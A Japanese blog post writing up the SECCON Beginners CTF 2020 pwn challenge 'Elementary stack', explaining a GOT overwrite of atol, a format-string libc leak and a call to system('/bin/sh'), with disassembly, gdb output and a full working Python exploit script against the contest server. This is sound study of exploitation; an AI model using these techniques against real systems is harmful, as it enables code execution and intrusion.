+++
category = [ "tech" ]
tags = [ "ctf", "ctf4b", "seccon", "pwn" ]
date = 2020-06-04
title = "SECCON Beginners CTF 2020 Elementary stackを理解する"
description = "ctf4bで得ことができなかったPwnのelementary stackを理解するまでをメモ．"
+++

こんにちは．リモート授業で一度も授業が一度も授業に現れず資料も与えられずにただただ課題のPDFが配布される授業があるのですが，中間試験はしっかりと行われることが告知されて萎えています．今回はCTF4Bから2週間弱たちましたが，解けなかった問題について考えてみました．

僕が本番で解けた問題のWrite upは[こちら](https://terassyi.net/posts/2020/05/24/ctf4b.html)．
## Elementary stack
Pwnの問題です．本番ではチラッと覗いて難しそうだったのであまり時間をかけず他の問題を考えていましたが．楽しそうなのでこの問題について考えてみました．いくつかwrite upを梯子して僕がどのように考えたのかをメモします．実行ファイル`chall`と`main.c`，`libc-2.27.so`が与えられました．
コードは以下のようになっています．
```c
long readlong(const char *msg, char *buf, int size) {
  printf("%s", msg);

  if (read(0, buf, size) <= 0)
    fatal("I/O error");
  buf[size - 1] = 0;

  return atol(buf);
}

int main(void) {
  int i;
  long v;
  char *buffer;
  unsigned long x[X_NUMBER];

  if ((buffer = malloc(0x20)) == NULL)
    fatal("Memory error");

  while(1) {
    i = (int)readlong("index: ", buffer, 0x20);
    v = readlong("value: ", buffer, 0x20);

    printf("x[%d] = %ld\n", i, v);
    x[i] = v;
  }
  return 0;
}

```
無限ループに囲まれているのでmain関数のリターンアドレスを書き換えるようなことはできなさそうです．`malloc`で`buffer`の領域を保持してそこに`read`を使用して値を書き込んで配列xに値を書き込んでいくプログラムのようです．
mallocした場所に入力値を格納しているのですが，ローカル変数`*buffer`として保持した領域のポインタを持っているのでなんとかなりそう．
`/bin/sh`をどうやって実行させるかを考えますが，今回は`readlong`関数内の`atol`をGOT overwriteして`system('/bin/sh')`を呼び出すべきだったようです．しかし，libcのアドレスがわからないので`system`のアドレスがわからないんですね．ここで僕は全くわからなかったんですが，一度`atol@got`を`printf`に書き換えることで`atol(buf)`を`printf(buf)`とすることでformat string bugを発生させることが出来るそうです．なるほどすごい．format string attackでlibcのアドレスをリークすることで`system`関数を呼び出すことが出来るようになります．
手順的には以下のような感じ．
1. `atol@got`を`printf`に書き換える
2. `printf(buf)`を実行させてformat string bugを発生させてlibcのアドレスをリーク
3. `system`のアドレスを計算
4. `atol`を`system`に向ける

手順は理解しましたが実際にやるのは難しいですよね．やってみます．

### 解いてみる
#### ステップ1
手順1をまずはクリアしましょう．`atol@got`を`printf`に書き換えるためには
```c
x[i] = v;
```
ここを利用します．`x[i]=atolのアドレス`，`v=printfのアドレス`という風に指定できれば書き換えが可能です．
書き換えには`*buffer`を利用します．ディスアセンブルの結果をみてみます．
```
   0x00000000004007c7 <+41>:	mov    rax,QWORD PTR [rbp-0x50]
   0x00000000004007cb <+45>:	mov    edx,0x20
   0x00000000004007d0 <+50>:	mov    rsi,rax
   0x00000000004007d3 <+53>:	lea    rdi,[rip+0x100]        # 0x4008da
   0x00000000004007da <+60>:	call   0x40072a <readlong>
   0x00000000004007df <+65>:	mov    DWORD PTR [rbp-0x54],eax
   0x00000000004007e2 <+68>:	mov    rax,QWORD PTR [rbp-0x50]
   0x00000000004007e6 <+72>:	mov    edx,0x20
   0x00000000004007eb <+77>:	mov    rsi,rax
   0x00000000004007ee <+80>:	lea    rdi,[rip+0xed]        # 0x4008e2
   0x00000000004007f5 <+87>:	call   0x40072a <readlong>
   0x00000000004007fa <+92>:	mov    QWORD PTR [rbp-0x48],rax
   0x00000000004007fe <+96>:	mov    rdx,QWORD PTR [rbp-0x48]
   0x0000000000400802 <+100>:	mov    eax,DWORD PTR [rbp-0x54]
   0x0000000000400805 <+103>:	mov    esi,eax
   0x0000000000400807 <+105>:	lea    rdi,[rip+0xdc]        # 0x4008ea
   0x000000000040080e <+112>:	mov    eax,0x0
   0x0000000000400813 <+117>:	call   0x400590 <printf@plt>
   0x0000000000400818 <+122>:	mov    rdx,QWORD PTR [rbp-0x48]
   0x000000000040081c <+126>:	mov    eax,DWORD PTR [rbp-0x54]
   0x000000000040081f <+129>:	cdqe
   0x0000000000400821 <+131>:	mov    QWORD PTR [rbp+rax*8-0x40],rdx
```
少し長いですが，`buffer`は`rbp-0x50`に格納されています．また，配列xの先頭アドレスは`rbp-0x40`のようですね．入力されたi, vは最終的にrax, rdxに格納されて
```
mov    QWORD PTR [rbp+rax*8-0x40],rdx
```
で`x[i]=v`に対応する処理を行っています．つまり，`i= -2`とすることができれば，上の命令を`rbp-0x50`つまり`*buffer`にvの値を代入する処理にすることができます．

さて，`atol`のアドレスは`readlong`を覗くと`call   0x4005d0 <atol@plt>`とあるので`0x4005d0`を覗くと
```
   0x00000000004005d0 <atol@plt+0>:	jmp    QWORD PTR [rip+0x200a6a]        # 0x601040
   0x00000000004005d6 <atol@plt+6>:	push   0x5
   0x00000000004005db <atol@plt+11>:	jmp    0x400570
   0x00000000004005e0 <exit@plt+0>:	jmp    QWORD PTR [rip+0x200a62]        # 0x601048
   0x00000000004005e6 <exit@plt+6>:	push   0x6
   0x00000000004005eb <exit@plt+11>:	jmp    0x400570
```
とあります．なので`*buffer=0x601040`とすれば`atol`のアドレスは書き換え可能ですね．
次の`readlong`の呼び出しで`printf`のアドレスを書き込みます．`printf`のアドレスは`0x400590`です．
しかし，これで試してみるとうまくいきません．
`buffer`に`atol@got`を書き込み，`atol@got`を`printf@plt`に書き換えてprintf関数を呼び出すわけですが，この時に`*buffer = atol@got = printf@plt`となっているためアドレスリークのために`%p`などを入力すると`*buffer = atol@got = printf@plt = "%32$p"`となり，printf関数のアドレスが上書きされて呼び出されなくなってしまいます．
これを防ぐために，`atol@got`ではなく，一つ前の`malloc@got`を`*buffer`に格納します．
アドレスのマッピングは以下のようになっています．
```
   0x00000000004005c0 <malloc@plt+0>:	jmp    QWORD PTR [rip+0x200a72]        # 0x601038
   0x00000000004005c6 <malloc@plt+6>:	push   0x4
   0x00000000004005cb <malloc@plt+11>:	jmp    0x400570
   0x00000000004005d0 <atol@plt+0>:	jmp    QWORD PTR [rip+0x200a6a]        # 0x601040
   0x00000000004005d6 <atol@plt+6>:	push   0x5
   0x00000000004005db <atol@plt+11>:	jmp    0x400570
```
`malloc@got`を`*buffer`に格納して，`'a'*8 + printf@plt`のように書き込むことで8バイト分の余白を持たせつつ`atol@got`を`printf@plt`に書き換えることができます．

ここまででのソルバーのコードはこんな感じ．問題の構造を理解するために`pwntools`などは使わずにやってみます(素人すぎて使い方知らないだけ)．
```python
import socket, time, telnetlib

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('es.quals.beginners.seccon.jp', 9003))

print(s.recv(2048).decode())
time.sleep(1)

s.sendall(b'-2\n')
time.sleep(1)

print(s.recv(2048).decode())

print("[info] overwrite buffer address to atol@got")
s.sendall(str(0x601038).encode()) # malloc
# s.sendall(str(0x601040).encode()) # atol
# time.sleep(1)

print(s.recv(2048).decode())
time.sleep(1)

print("[info] overwrite atol@got to printf@plt")
s.sendall(b"a"*8 + (0x400590).to_bytes(8, 'little') + b'\n') # printf
# s.sendall((0x400590).to_bytes(8, 'little'))
time.sleep(1)
print(s.recv(2048))
```
念のため各処理のあと１秒スリープさせています．
ここで注意して欲しいのは`malloc@got`をアドレスを書き込む時です．最初は`(0x601038).to_bytes(8, 'little')`のようにリトルエンディアンに変換して書き込んでいたんですが，これではうまくいきません．入力された値は`read`で文字列で読み込まれて`atol`でlongに変換されるのでバイト列で入力したら意図した値を書き込めないんですね〜．素直にアドレスの数値を書き込みましょう．ここ少しはまりました．何はともあれこれでステップ１は完了です．次にいきましょう．

#### ステップ2
ステップ２はprintf関数を使用してformat string attackを行いlibcのアドレスをリークします．
format string attackについては[こちらの記事](https://ptr-yudai.hatenablog.com/entry/2018/10/06/234120)を参照してください．
libcのベースアドレスを取得するためにprintf関数を実行している時のスタックをみてみます．
```
gdb-peda$ x/32g $rsp
0x7fffffffddd0:	0x0000000000000001	0x00000001f7ffe170
0x7fffffffdde0:	0x0000000000602260	0x0000000000000000
0x7fffffffddf0:	0x0000000000000002	0x000000000040087d
0x7fffffffde00:	0x00007ffff7de59a0	0x0000000000000000
0x7fffffffde10:	0x0000000000400830	0x00000000004005f0
0x7fffffffde20:	0x00007fffffffdf10	0x0000000000000000
0x7fffffffde30:	0x0000000000400830	0x00007ffff7a05b97
```
こんな感じです．libcのアドレスは実行ごとに変化するので確定した値はありませんが，毎回末尾に`b97`が現れるメモリがありますね．このメモリの値が差す場所をみてみます．
```
gdb-peda$ x/4wx 0x7ffff7a05b97
0x7ffff7a05b97 <__libc_start_main+231>:	0x82e8c789	0x48000215	0xed23058b	0xc148003c
```
こんな感じになっており，ここが`__libc_start_main+231`であることがわかります．というわけで`%[n]$p`で番号を指定してアドレスを取得します．他の方のwrite upでは25を指定しています．どうやって25というのがわかったんでしょう．僕はやり方がわからなかったので頑張って番号をインクリメントしながら探しました．というわけで25を指定すればlibcのアドレスがわかります．
```python
print("[info] address leak by format string attack")
s.sendall(b"%25$p" + b'\n')
time.sleep(1)

print(s.recv(2048))
time.sleep(1)
```
上記のコードを先ほどのコードに追記します．
不明な点はありますがなんとかlibcのアドレスを取得できました．次のステップでは`system`関数のアドレスを計算します．

#### ステップ3
`system`関数のアドレスを計算して求めましょう．
まずはlibcのベースアドレスを求めます．ステップ2で求めたのは`__libc_start_main+231`でした．
`__libc_start_main`のアドレスは以下のようにして見つけることができました．
```
$ objdump -S -M intel ./libc-2.27.so | grep libc_start_main
0000000000021ab0 <__libc_start_main@@GLIBC_2.2.5>:
```
従って，libcのベースアドレスは`[__libc_start_main+231の値] - 0x21ab0 - 231`となります．
次にlibcのsystem関数のアドレスを取得します．
```
$ objdump -S -M intel ./libc-2.27.so | grep libc_system
000000000004f440 <__libc_system@@GLIBC_PRIVATE>:
```
従って，system関数のアドレスは`system = libc_base + 0x4f440`で求めることができます．
ステップ4に進みましょう．

#### ステップ4
system関数のアドレスがわかったので`atol@got`を書き換えましょう．引数には`/bin/sh`を入れます．
入力バッファは現在`malloc@got`からとっています．`atol(buf)`(現在は`printf(buf)`を指している)は`atol`を`system`に書き換えると，`system(buf)`として実行されます．つまり，入力する値は`"/bin/sh\0" + systemのアドレス`とすれば`system("/bin/sh")`が呼び出されます．
以下をコードに追記してください．
```python
s.sendall(b"/bin/sh\0" + system.to_bytes(8, 'little'))

print(s.recv(2048))
print("[info] success to exploit!!!")
t = telnetlib.Telnet()
t.sock = s
```
実行するとフラグを得ることができました．
```
[info] success to exploit!!!
ls
chall
flag.txt
redir.sh
cat flag.txt
ctf4b{4bus1ng_st4ck_d03snt_n3c3ss4r1ly_m34n_0v3rwr1t1ng_r3turn_4ddr3ss}
```

#### 攻撃コード
今回作成したコードはこちら．pwntools使えるように勉強しなくては．
```python
import socket, time, telnetlib


malloc_got = 0x601038
printf_plt = 0x400590
libc_start_main_symbol = 0x21ab0
libc_system = 0x4f440

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('es.quals.beginners.seccon.jp', 9003))

print(s.recv(2048).decode())
time.sleep(1)

s.sendall(b'-2\n')
time.sleep(1)

print(s.recv(2048).decode())

print("[info] overwrite buffer address to atol@got")
s.sendall(str(malloc_got).encode()) # malloc
# s.sendall(str(0x601040).encode()) # atol
# time.sleep(1)

print(s.recv(2048).decode())
time.sleep(1)

print("[info] overwrite atol@got to printf@plt")
s.sendall(b"a"*8 + printf_plt.to_bytes(8, 'little') + b'\n') # printf
# s.sendall((0x400590).to_bytes(8, 'little'))
time.sleep(1)
print(s.recv(2048))

s.sendall(b"%25$p")
time.sleep(1)
libc_start_main = int(s.recv(14).decode(), 16)
libc_base = libc_start_main - libc_start_main_symbol - 231
print("[info] libc base: ", hex(libc_base))
system = libc_base + libc_system
print("[info] system: ", hex(system))
time.sleep(1)

s.sendall(b"/bin/sh\0" + system.to_bytes(8, 'little'))

print(s.recv(2048))
print("[info] success to exploit!!!")
t = telnetlib.Telnet()
t.sock = s

t.interact()
```

### まとめ
非常に楽しい問題でした．pwnやってる気になりましたね．僕のような初心者が本番で特には難しい問題でしたが，一つ一つステップを踏んで理解すれば解ける問題でした．また，基本的なテクニックが詰まっている問題だったのでこれを自分で理解することができればレベルアップできる気がします．そういった意味で初心者にとってすごくいい問題だったと思います．ありがとうございました．
